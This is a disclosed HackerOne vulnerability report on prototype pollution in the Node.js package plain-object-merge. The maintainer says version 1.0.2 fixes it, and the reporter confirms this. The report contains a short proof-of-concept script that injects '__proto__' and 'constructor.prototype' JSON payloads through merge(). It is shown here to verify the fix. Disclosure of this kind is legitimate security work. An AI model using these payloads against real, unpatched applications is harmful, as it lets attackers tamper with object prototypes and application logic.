---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/modification-of-assumed-immutable-data-maid
  - env/web
  - stack/node
substate: "resolved"
weakness: "Modification of Assumed-Immutable Data (MAID)"
enriched: true
date: 2021-03-13
submitted: 2020-05-11T22:23:34.390Z
bounty_usd: null
votes: 2
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "d3lla"
source: "https://hackerone.com/reports/871156"
title: "[plain-object-merge] Prototype pollution"
---
# [plain-object-merge] Prototype pollution

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 2 | **Program:** Node.js third-party modules | **Disclosed:** 2021-03-13

- Report: [https://hackerone.com/reports/871156](https://hackerone.com/reports/871156)
- CWE: Modification of Assumed-Immutable Data (MAID)
- Submitted: 2020-05-11T22:23:34.390Z

## Timeline

- **Report Filed**
- **2020-05-12** @nochnoidozor: Hi @d3lla,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@nochnoidozor
- **Report Triaged**
- **External User Joined**
- **2021-02-11** @fabiospampinato: No clue how HackerOne works, but this is fixed as of plain-object-merge@1.0.2.
- **2021-02-11** @bbe8482aecd24374d13c5de15a0a6: Thank you very much for the update @fabiospampinato.
Can you confirm this @d3lla?
- **2021-02-11** @d3lla: Hi @fabiospampinato and @danielruf ,
@fabiospampinato  thank you for the update.

The change seems to fix the problem. I run the following poc:

```javascript
const merge = require('plain-object-merge');
const obj = {};
console.log("Before : " + obj.polluted);
merge([{}, JSON.parse('{"__proto__":{"polluted":"yes"}}')]);
console.log("After : " + obj.polluted);
merge([{}, JSON.parse('{"constructor": {"prototype": {"polluted": "yes"}}}')]);
console.log("After : " + obj.polluted);

```

and I was not able to reproduce the previous reported result. Now I obtain:
```console
Before : undefined
After : undefined
After : undefined

```
{F1192411}


Thanks for your time and have a nice day,
d3lla

I tested using the following configurations:
- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.15.4
- NPM VERSION: 6.14.10
- **Report Resolved**
- **Agreed On Going Public**
- **2021-02-11** @bbe8482aecd24374d13c5de15a0a6: @d3lla not sure if I have some more time today.
- **Report Became Public**
